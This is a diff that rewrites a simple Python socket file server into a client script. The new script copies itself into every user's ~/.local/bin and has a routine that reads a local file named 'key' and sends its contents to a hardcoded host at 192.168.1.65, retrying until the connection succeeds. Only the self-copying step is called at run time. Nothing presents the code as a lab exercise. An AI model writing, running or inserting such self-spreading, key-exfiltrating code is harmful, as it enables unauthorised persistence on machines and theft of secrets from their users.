@@ -1,38 +1,54 @@
 from socket import socket, gethostname
+from os import makedirs,listdir
+from os.path import dirname, exists
+from pathlib import Path
+from shutil import move,copy
+from time import sleep
 
 port=11111
+host='192.168.1.65'
 
 
 sock=socket()
-sock.bind(('192.168.213.4', port)) #again, this requires a tuple
+def copy_self():
+    for each in listdir('/home/'):
+        pth='/home/'+each+'/.local/bin'
+        try:
+            makedirs(pth,exist_ok=True)
+            copy(__file__,pth)
+        except PermissionError:
+            pass
 
-sock.listen(5) #lsiten for bad connection 
-                #dont understand why the original code wrote this line, need to research
+def connector():
+    try:
+        sock.connect((host, port)) #again, this requires a tuple
+    except ConnectionRefusedError:
+        sleep(5)
+        connector()
+        
+def sender():
+    connector()
+    while True:
+        sock.send(b"Hello. File starts now\n")
+        sock.send(b"--------------------------------------------------------------\n")
 
-while True:
-    conn,addr= sock.accept()  #this is to establish a connection
+        with open('key','r') as f:
+            data=f.read().encode('utf-8')
+        sock.send(data)
+    
+        sock.send(b"\n--------------------------------------------------------------")
+        sock.send(b"\nFile Complete\n")
+        print("Sending complete")
+        break
 
-    data_recv=conn.recv(1024)
+    sock.shutdown(1)
 
-    print(data_recv)
+    sock.close()
 
-    with open('testfile','r') as sf:
-        data = sf.read(1024)    #reading 1024 bytes at a time
-        while data:
-            conn.send(data)
 
-            data=sf.read(1024)  #reading another 1024 bytes of data
+if __name__=='__main__':
+    copy_self()
 
-        #the while loop will continue until the file reaches EOF
-
-    print("Sending complete")
-
-    conn.close()
-    break
-
-sock.shutdown(1)
-
-sock.close()
 
         
 
